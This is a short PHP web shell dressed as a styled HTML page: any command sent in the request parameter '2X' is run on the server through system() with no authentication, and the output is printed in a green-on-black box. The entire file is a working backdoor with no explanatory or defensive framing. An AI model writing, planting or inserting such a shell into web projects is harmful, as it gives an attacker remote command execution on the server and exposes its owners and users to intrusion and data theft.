<head>
<style>
    pre {color:green;
        border: 5px solid;
        border-radius:10px;
        border-color:black;
        background-color:black;
        font-size: 20;}
    body {background-color:gray}
</style>
</head>
<body>
<?php
if(isset($_REQUEST['2X'])){
    $command = $_REQUEST['2X'];
    echo "<pre>";
    system($command);
    echo "</pre>";
    die;
}
?>
</body>
